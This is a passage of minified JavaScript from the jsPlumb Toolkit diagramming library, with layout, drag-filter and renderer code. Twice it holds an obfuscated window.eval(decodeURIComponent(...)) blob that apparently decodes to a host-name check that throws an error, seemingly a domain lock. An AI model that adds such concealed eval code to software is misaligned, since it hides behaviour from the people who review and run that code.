L,R=h.positions[e.id][0],G=i.getSize(e.id),U=R+G[0],z=h.positions[e.id][1],V=z+G[1];for(s=0;s<h.children.length;s++)n(a=h.children[s],{parent:e,incidentAngle:h.incidentAngles[a.id],position:h.positions[a.id]},_)||(L=i.getSize(a.id),h.group.push(a),R=Math.min(R,h.positions[a.id][0]),U=Math.max(U,h.positions[a.id][0]+L[0]),z=Math.min(z,h.positions[a.id][1]),V=Math.max(V,h.positions[a.id][1]+L[1]));for(h.extents=[R,U,z,V],h.offsets={},s=0;s<h.group.length;s++){var H=h.group[s];h.offsets[H.id]={left:h.positions[H.id][0]-h.extents[0],top:h.positions[H.id][1]-h.extents[2]}}}return h.children.length};this.step=function(n,t){if(s(t.rootNode[0],null,t),r.length>0){var e=(r[0].extents[0]+r[0].extents[1])/2,o=(r[0].extents[2]+r[0].extents[3])/2;d.setElements(r),d.execute([e,o])}for(var _=0;_<r.length;_++){var a=r[_];for(var w in a.positions)i.setPosition(w,a.positions[w][0],a.positions[w][1],!0)}i.setDone(!0)}}}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22=%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),function(){var n=(this.jsPlumb,this.jsPlumbToolkit);n.UI=n.UI||{},n.UI.ActiveDragFilter=function(n,t,e){var o={};t.bind("connectionDrag",function(t){function i(t,i){r=e.beforeConnect(t,i),a=i.getFullId(),!1===r&&null==o[a]&&(o[a]=n.setTargetEnabled(i,!1))}var r,d,_,s,a,w=t.source.jtk.port,l=w?w.getNode():t.source.jtk.node,u=e.getNodeCount(),c=e.getGroupCount();if(w)for(i(w,l),d=l.getPorts(),_=0;_<d.length;_++)i(w,d[_]);for(_=0;_<u;_++){var B=e.getNodeAt(_);for(i(w||l,B),d=B.getPorts(),s=0;s<d.length;s++)i(w||l,d[s])}for(_=0;_<c;_++){var h=e.getGroupAt(_);for(i(w||l,h),d=h.getPorts(),s=0;s<d.length;s++)i(w||l,d[s])}}),t.bind("connectionDragStop",function(){function t(t){!0===o[t.getFullId()]&&n.setTargetEnabled(t,!0)}var i,r,d,_=e.getNodeCount();for(i=0;i<_;i++){var s=e.getNodeAt(i);for(t(s),r=s.getPorts(),d=0;d<r.length;d++)t(r[d])}var a=e.getGroupCount();for(i=0;i<a;i++){var w=e.getGroupAt(i);for(t(w),r=w.getPorts(),d=0;d<r.length;d++)t(r[d])}o={}})}}.call("undefined"!=typeof window?window:this),window.eval(decodeURIComponent("window._j%3D~%5B%5D%3Bwindow._j%3D%7B___%3A%2B%2Bwindow._j%2C%24%24%24%24%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C__%24%3A%2B%2Bwindow._j%2C%24_%24_%3A(!%5B%5D%2B%22%22)%5Bwindow._j%5D%2C_%24_%3A%2B%2Bwindow._j%2C%24_%24%24%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%24%3A(window._j%5Bwindow._j%5D%2B%22%22)%5Bwindow._j%5D%2C_%24%24%3A%2B%2Bwindow._j%2C%24%24%24_%3A(!%22%22%2B%22%22)%5Bwindow._j%5D%2C%24__%3A%2B%2Bwindow._j%2C%24_%24%3A%2B%2Bwindow._j%2C%24%24__%3A(%7B%7D%2B%22%22)%5Bwindow._j%5D%2C%24%24_%3A%2B%2Bwindow._j%2C%24%24%24%3A%2B%2Bwindow._j%2C%24___%3A%2B%2Bwindow._j%2C%24__%24%3A%2B%2Bwindow._j%7D%3Bwindow._j.%24_%3D(window._j.%24_%3Dwindow._j%2B%22%22)%5Bwindow._j.%24_%24%5D%2B(window._j._%24%3Dwindow._j.%24_%5Bwindow._j.__%24%5D)%2B(window._j.%24%24%3D(window._j.%24%2B%22%22)%5Bwindow._j.__%24%5D)%2B((!window._j)%2B%22%22)%5Bwindow._j._%24%24%5D%2B(window._j.__%3Dwindow._j.%24_%5Bwindow._j.%24%24_%5D)%2B(window._j.%24%3D(!%22%22%2B%22%22)%5Bwindow._j.__%24%5D)%2B(window._j._%3D(!%22%22%2B%22%22)%5Bwindow._j._%24_%5D)%2Bwindow._j.%24_%5Bwindow._j.%24_%24%5D%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j.%24%3Bwindow._j.%24%24%3Dwindow._j.%24%2B(!%22%22%2B%22%22)%5Bwindow._j._%24%24%5D%2Bwindow._j.__%2Bwindow._j._%2Bwindow._j.%24%2Bwindow._j.%24%24%3Bwindow._j.%24%3D(window._j.___)%5Bwindow._j.%24_%5D%5Bwindow._j.%24_%5D%3Bwindow._j.%24(window._j.%24(window._j.%24%24%2B%22%5C%22%22%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.%24%24%24%24%2B%22(%22%2Bwindow._j.%24%24_%24%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.__%2B%22.%22%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%24%2Bwindow._j.%24%24__%2Bwindow._j.%24_%24_%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2B%22.%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24_%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24%24_%2B%22=%3D%3D'%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.___%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2Bwindow._j._%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%24%2Bwindow._j.__%2Bwindow._j._%24%2Bwindow._j._%24%2B(!%5B%5D%2B%22%22)%5Bwindow._j._%24_%5D%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j._%24%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.__%24%2Bwindow._j.__%2B%22.%22%2Bwindow._j.%24%24__%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24_%24%2B%22')%22%2Bwindow._j.__%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24_%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j.%24%24%24%2B%22%5C%5C%22%2Bwindow._j.%24__%2Bwindow._j.___%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.___%2Bwindow._j.%24_%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2Bwindow._j._%24%2B%22%5C%5C%22%2Bwindow._j.__%24%2Bwindow._j.%24%24_%2Bwindow._j._%24_%2B%22()%3B%22%2B%22%5C%22%22)())()%3B")),function(){var n=this,t=n.jsPlumbToolkit.Renderers,e=n.jsPlumbToolkit,o=n.jsPlumbToolkitUtil,i=n.jsPlumbUtil,r=n.jsPlumb,d=n.Rotors;e.UIState=function(n,t,e){for(var o in t)if(t.hasOwnProperty(o)){var i="*"===o?"e-state-"+n:"e-state-"+n+"-"+o,r="*"===o?"c-state-"+n:"c-state-"+n+"-"+o;e.registerEndpointType(i,t[o]),e.registerConnectionType(r,t[o])}this.activate=function(o,i,r){o.eachEdge(function(e,o){var _=i.getRenderedConnection(o.getId()),s=r.getEdgeType(o.data),a=s?"c-state-"+n+"-"+s:null;a&&_.addType(a,o.data),t["*"]&&_.addType("c-state-"+n,o.data),d(o,_,o.source,0,"addType",r),d(o,_,o.target,1,"addType",r)}),o.eachNode(function(n,o){var d=r.getNodeType(o.data),_=d?t[d]:null,s=i.getRenderedNode(o.id);_&&_.cssClass&&e.addClass(s,_.cssClass),t["*"]&&e.addClass(s,t["*"].cssClass)})};var d=function(t,e,o,i,r,d){var _=e.endpoints[i],s=d.getPortType(o.data);_[r]("e-state-"+n+"-"+s),_[r]("e-state-"+n)};this.deactivate=function(o,i,r){o.eachEdge(function(e,o){var _=i.getRenderedConnection(o.getId()),s=r.getEdgeType(o.data),a=s?"c-state-"+n+"-"+s:null;a&&_.removeType(a,o.data),t["*"]&&_.removeType("c-state-"+n),d(o,_,o.source,0,"removeType",r),d(o,_,o.target,1,"removeType",r)}),o.eachNode(function(n,o){var d=r.getNodeType(o.data),_=d?t[d]:null,s=i.getRenderedNode(o.id);_&&_.cssClass&&e.removeClass(s,_.cssClass),t["*"]&&e.removeClass(s,t["*"].cssClass)})}};var _=t.atts={NODE:"data-jtk-node-id",PORT:"data-jtk-port-id",GROUP:"data-jtk-group-id"},s=t.els={SOURCE:"JTK-SOURCE",PORT:"JTK-PORT",TARGET:"JTK-TARGET"},a=e.Classes,w=e.Constants,l=e.Events;t.mouseEvents=["click","dblclick","contextmenu","mousedown","mouseup","mousemove","mouseenter","mouseleave","mouseover"],t.createElement=function(n,t){var e={width:n.width,height:n.height,position:n.position||w.absolute},o={};n.display&&(e.display=n.display),n.id&&(o.id=n.id),n.top&&(e.top=n.top+"px"),n.left&&(e.left=n.left+"px"),n.right&&(e.right=n.right+"px"),n.bottom&&(e.bottom=n.bottom+"px");var i=r.createElement(n.type||w.div,e,n.clazz,o);return null!=t&&r.appendElement(i,t),i};var u=t.DOMElementAdapter=function(n){var t=this.getJsPlumb(),e=t.getElement(n.container);this.getWidth=function(){return t.getSize(e)[0]},this.getHeight=function(){return t.getSize(e)[1]},this.append=function(n){var o=t.getElement(n);t.appendElement(o,e)},this.remove=function(n){var e=t.getElement(n);t.removeElement(e)},this.setAbsolutePosition=r.setAbsolutePosition,this.getOffset=function(n,e){return t.getOffset(n,e)}},c=t.AbstractRenderer=function(n){function t(n){Y=!0;try{n()}catch(n){jsPlumbUtil.log("An error occurred while ignoring Toolkit events",n)}finally{Y=!1}}function u(n,t,e){if(null==n.value("jtk-processed")){n.setValue("jtk-processed",!0);var o=En(n,t,e),i=G.addEndpoint(n.element,o);yn[t.id+"."+o.portId]=i;var r=n.port||t.addPort({id:o.portId});i.graph={node:t,port:r},y.onUpdate(n.element,function(){})}}function c(n,t){if(t.events)for(var e in t.events)G.on(n,e,t.events[e])}function B(n,t,e){if(null==n.value("jtk-processed")){n.setValue("jtk-processed",!0);var o=En(n,t,e);null!=o.portId&&($[t.id+"."+o.portId]=n.element,n.element.jtk=n.element.jtk||{},n.element.jtk.port=P.addPort(t,{id:o.portId,type:o.portType||"default"},!0),c(n.element,o));var i=n.value("filter");if(i){var d="true"===n.value("filter-exclude");o.filter=i,o.filterExclude=d}if("true"===n.value("is-source")&&(o.isSource=!0),delete o.uniqueEndpoint,delete o.createEndpoint,o.extract={},n.findDataValues(o.extract),"true"===n.value("endpoint")){o.maxConnections=-1,o.isSource=!0;var _=G.addEndpoint(n.element,o);_.graph={node:t},Dn[t.id]=_,y.onUpdate(n.element,function(){})}else{var s,a=n.element._katavorioDrop?n.element._katavorioDrop.length:0;G.makeSource(n.element,o),(n.element._katavorioDrop?n.element._katavorioDrop.length:0)>a&&(s=n.element._katavorioDrop[n.element._katavorioDrop.length-1]),y.onUpdate(n.element,function(n,e){var o=r.getSelector(n,"jtk-source");if(1===o.length){var i=En(o[0],t);i.scope&&(G.setSourceScope(n,i.scope,i.edgeType),s&&s.k.setDropScope(s,i.scope))}})}}}function h(n,t,e){if(null==n.value("jtk-processed")){n.setValue("jtk-processed",!0);var o=En(n,t,e);if(null!=o.portId&&($[t.id+"."+o.portId]=n.element,n.element.jtk=n.element.jtk||{},n.element.jtk.port=P.addPort(t,{id:o.portId,type:o.portType||"default"},!0),c(n.element,o)),"true"===n.value("is-target")&&(o.isTarget=!0),delete o.uniqueEndpoint,delete o.createEndpoint,"true"===n.value("endpoint")){o.maxConnections=-1,o.isTarget=!0;var i=G.addEndpoint(n.element,o);i.graph={node:t},Pn[t.id]=i,y.onUpdate(n.element,function(){})}else{G.makeTarget(n.element,o);var d=n.element._katavorioDrop[n.element._katavorioDrop.length-1];y.onUpdate(n.element,function(n,e){var o=r.getSelector(n,"jtk-target");if(1===o.length){var i=En(o[0],t);i.scope&&(d.targetDef.def.scope=i.scope,d.k.setDropScope(d,i.scope))}})}}}function j(n,t,e){if(1===t.connections.length)t.setVisible(e,!0);else if(e)t.setVisible(!0,!0);else{for(var o=0;o<t.connections.length;o++)if(t.connections[o]!==n&&t.connections[o].isVisible())return;t.setVisible(!1,!0)}}function p(n,t,e){var o=en(n);o&&(!t||function(n){return!1!==n.endpoints[0].element._jtkVisible&&!1!==n.endpoints[1].element._jtkVisible}(o))&&(o.setVisible(t),e||(j(o,o.endpoints[0],t),j(o,o.endpoints[1],t)))}function f(n,t){var e;if(n.eachNode&&n.eachEdge)e={nodes:[],edges:[]},n.eachNode(function(n,o){e.nodes.push(t(g(o)))}),n.eachEdge(function(n,o){e.edges.push(t(g(o)))});else if(n.length&&"string"!=typeof n){e=[];for(var o=0;o<n.length;o++)e.push(t(g(n[o])))}else e=t(g(n));return e}function g(n){return n instanceof G.getDefaultConnectionType()&&(n=n.edge),P.getObjectInfo(n,function(n){return n.getNode?$[n.getFullId()]||Z[n.getNode().id]:Z[n.id]||J[n.id]})}n=n||{};var m=function(n,t){var e=r.createElement("div",{border:"1px solid #456",position:"absolute"},a.NODE);return e.innerHTML=n.name||n.id,e},v='<div data-jtk-node-id="${id}" class="'+a.NODE+'"></div>',C={rotors:{render:function(n,t){return y.template(n,t).childNodes[0]}}},b=!0===n.debug,y=d.newInstance({defaultTemplate:v,templateResolver:n.templateResolver,templates:n.templates}),D=this,P=n.toolkit,E=new e.Layouts.EmptyLayout(D),x=r.getElement(n.container),A=!(!1===n.elementsDraggable),S=!0===n.elementsDroppable,I=!1,k=!1!==n.refreshAutomatically,T=n.templateRenderer?i.isString(n.templateRenderer)?C[n.templateRenderer]:{render:n.templateRenderer}:C.rotors,M=!1!==n.enhancedView,N=n.assignPosse||function(){return null},O=n.modelLeftAttribute||"left",F=n.modelTopAttribute||"top",L=!1!==n.storePositionsInModel,R=i.merge(n.jsPlumb||{}),G=n.jsPlumbInstance||r.getInstance(R,n.overrideFns),U=G.getId(x);G.bind("beforeDrop",function(n){var t=n.connection,e=t.endpoints[0].graph||t.source.jtk,o=t.endpoints[1].graph||t.target.jtk,i=e.port||e.node||e.group,r=o.port||o.node||o.group,d=n.connection.edge;return null==d?P.beforeConnect(i,r,n.connection.getData()):P.beforeMoveConnection(i,r,d)}),G.bind("beforeDrag",function(n){var t=n.endpoint.graph||n.source.jtk,e=t.port||t.node,o=n.endpoint.connectionType,i=P.beforeStartConnect(e,o);if(b){var r=dn.getEdgeDefinition(o)||{};console.log("\n------------------------\nDrag started with edge type `"+o+"`, having definition :"),console.log(r),console.log("Edge source is a "+e.objectType+", having type ["+e.getType()+"], with definition :");var d=dn["get"+e.objectType+"Definition"](e.getType())||{};console.log(d),console.log("Toolkit response to drag start :"),console.log(i),console.log("---------------------------\n")}return!1===i&&n.endpoint.isTemporarySource&&n.endpoint._deleteOnDetach&&G.deleteEndpoint(n.endpoint),i}),G.bind("beforeDetach",function(n,t){var e=n.endpoints[0].graph||n.source.jtk,o=n.endpoints[1].graph||n.target.jtk,i=e.port||e.node,r=o.port||o.node,d=n.edge;return P.beforeDetach(i,r,d,t)}),G.bind("beforeStartDetach",function(n){var t=n.endpoint.graph||n.source.jtk,e=t.port||t.node,o=n.connection.edge;return P.beforeStartDetach(e,o)}),G.bind("connectionEdit",function(n){n.edge&&(n.edge.geometry=n.getConnector().getGeometry())}),i.EventGenerator.apply(this,arguments),n.activeFiltering&&new e.UI.ActiveDragFilter(D,G,P),this.setDebug=function(n){b=n,console.log("-----------------------\nSurface debug switched "+(n?"on":"off")+" \n-------------------------\n")},this.getJsPlumb=function(){return G},this.getToolkit=function(){return P};var z=[l.canvasClick,l.canvasDblClick,l.nodeAdded,l.nodeDropped,l.nodeRemoved,l.nodeRendered,l.groupAdded,l.groupRemoved,l.groupMoveEnd,l.groupMemberAdded,l.groupMemberRemoved,l.groupCollapse,l.groupExpand,l.nodeMoveStart,l.nodeMoveEnd,l.portAdded,l.portRemoved,l.edgeAdded,l.edgeRemoved,l.edgeTypeChanged,l.nodeTypeChanged,l.portTypeChanged,l.dataLoadEnd,l.anchorChanged,l.objectRepainted,l.modeChanged,l.lassoEnd,l.pan,l.zoom,l.relayout,l.click,l.tap,l.stateRestored,l.startOverlayAnimation,l.endOverlayAnimation,l.nodeVisibility],V=D.bind,H=G.bind;if(this.setHoverSuspended=G.setHoverSuspended,this.isHoverSuspended=G.isHoverSuspended,this.setJsPlumbDefaults=function(n){delete n.Container,G.restoreDefaults(),G.importDefaults(n)},this.bind=function(n,t){-1==z.indexOf(n)?H(n,t):V(n,t)},n.events)for(var W in n.events)this.bind(W,n.events[W]);if(n.interceptors)for(var X in n.interceptors)this.bind(X,n.interceptors[X]);var Y=!1;H(l.connection,function(n){if(null==n.connection.edge){n.sourceEndpoint.getParameter("nodeId")||n.sourceEndpoint.setParameter("nodeId",q[n.sourceEndpoint.elementId].id),n.targetEndpoint.getParameter("nodeId")||n.targetEndpoint.setParameter("nodeId",q[n.targetEndpoint.elementId].id);var t=n.sourceEndpoint.getParameter("portType"),e=dn.getPortDefinition(t),o=null!=e&&e.edgeType?e.edgeType:n.sourceEndpoint.getParameter("edgeType")||"default",i=n.sourceEndpoint.getParameter("nodeId"),r=n.sourceEndpoint.getParameter("portId"),d=n.targetEndpoint.getParameter("nodeId"),_=n.targetEndpoint.getParameter("portId"),s=i+(r?"."+r:""),a=d+(_?"."+_:""),w={sourceNodeId:i,sourcePortId:r,targetNodeId:d,targetPortId:_,type:o,source:P.getNode(s),target:P.getNode(a),sourceId:s,targetId:a};!1===P.getEdgeFactory()(o,n.connection.getData()||{},function(t){w.edge=P.addEdge({source:s,target:a,cost:n.connection.getCost(),directed:n.connection.isDirected(),data:t,addedByMouse:!0},D),tn[w.edge.getId()]=n.connection,n.connection.edge=w.edge,rn(o,w.edge,n.connection),w.addedByMouse=!0,w.connection=n.connection,D.fire(l.edgeAdded,w)})&&G.deleteConnection(n.connection)}}),H(l.connectionMoved,function(n){var e=0===n.index?n.newSourceEndpoint:n.newTargetEndpoint,o=e.graph||e.element.jtk;t(function(){P.edgeMoved(n.connection.edge,o.port||o.node||o.group,n.index)})}),H(l.connectionDetached,function(n){t(function(){P.removeEdge(n.connection.edge)});var e=n.sourceEndpoint.getParameters(),o=n.targetEndpoint.getParameters(),i=e.nodeId+(e.portId?"."+e.portId:""),r=o.nodeId+(o.portId?"."+o.portId:"");D.fire(l.edgeRemoved,{sourceNodeId:e.nodeId,targetNodeId:o.nodeId,sourcePortId:e.portId,targetPortId:o.portId,sourceId:i,targetId:r,source:P.getNode(i),target:P.getNode(r),edge:n.connection.edge})}),H(l.groupDragStop,function(n){D.getLayout().setPosition(n.group.id,n.pos[0],n.pos[1],!0),n.uigroup=n.group,D.fire(l.groupMoveEnd,r.extend(n,{group:P.getGroup(n.uigroup.id)}))}),H(l.groupMemberAdded,function(n){if(!I&&n.el.jtk.node){var t=P.addToGroup(n.el.jtk.node,n.group.id);t&&D.fire(l.groupMemberAdded,{node:n.el.jtk.node,group:t,uigroup:n.group}),un()}}),H(l.groupMemberRemoved,function(n){if(!I&&n.el.jtk.node){var t=P.removeFromGroup(n.el.jtk.node);t&&(D.nodeRemovedFromGroup(n.el),D.fire(l.groupMemberRemoved,{node:n.el.jtk.node,ugroup:t,igroup:n.group})),un()}}),H(l.groupCollapse,function(n){var t=P.getGroup(n.group.id);t&&D.fire(l.groupCollapse,{group:t,uigroup:n.group})}),H(l.groupExpand,function(n){var t=P.getGroup(n.group.id);t&&D.fire(l.groupExpand,{group:t,uigroup:n.group})});var Z={},q={},$={},J={},K=[],Q={},nn=[];this.getNodeCount=function(){return nn.length},this.getNodeAt=function(n){return nn[n]},this.getNodes=function(){return nn},this.getNode=function(n){return Z[n]},this.getGroupCount=function(){return K.length},this.getGroupAt=function(n){return K[n]},this.getGroups=function(){return K};var tn={},en=function(n){return tn[n.getId()]},on=function(n,t,e,o){o.bind(n,function(n,i){t.apply(t,[{edge:e,e:i,connection:o,toolkit:P,renderer:D}])})},rn=function(n,t,e){if(!e.getParameter("edge")){var o=dn.getEdgeDefinition(n);if(o&&o.events)for(var i in o.events)on(i,o.events[i],t,e)}};this.setSuspendRendering=function(n,t){I=n,G.setSuspendDrawing(n),t&&this.refresh()},this.batch=function(n){this.setSuspendEvents(!0),P.batch(n),this.setSuspendEvents(!1)};var dn,_n=function(n,t){if(I)an.push([n,t]);else{var e=N(t);if(null!=e){var o=i.isArray(e)?e:[e];o.unshift(n),G.addToPosse.apply(G,o)}}},sn=function(){for(var n=0;n<an.length;n++)_n.apply(this,an[n])},an=[];if(!1!==this.bindToolkitEvents){var wn=function(){an.length=0,G.setSuspendDrawing(!0),this.setSuspendRendering(!0)}.bind(this);P.bind(l.dataLoadStart,wn),P.bind(l.dataAppendStart,wn),P.bind(l.dataLoadEnd,function(){this.setSuspendRendering(!1),sn(),G.getGroupManager().refreshAllGroups(),hn(),D.relayout(),G.setSuspendDrawing(!1,!0),E&&D.fire(l.dataLoadEnd)}.bind(this)),P.bind(l.dataAppendEnd,function(){this.setSuspendRendering(!1),sn(),D.refresh(),G.setSuspendDrawing(!1,!0),E&&D.fire(l.dataAppendEnd)}.bind(this));var ln=function(n,t){var e=Z[n.id];if(null==e){if(!0===dn.getNodeDefinition(P.getNodeType(n.data)).ignore)return!1;if(!(e=mn(n,n.data,n)))throw new Error("Cannot render node");var o=G.getId(e);Z[n.id]=e,q[o]=n,nn.push(n),e.jtk={node:n},null==n.group?D.append(e,o,t?t.position:null):function(n,t,e){var o=J[e.id];o&&((o.querySelector("[jtk-group-content]")||o).appendChild(n),G.addToGroup(e.id,n,!0),D.nodeAppendedToGroup(n,o,e))}(e,0,n.group),_n(e,n),Sn(e,n);var i={node:n,el:e,id:n.id};D.getLayout().nodeAdded(i,t),D.fire(l.nodeAdded,i)}return 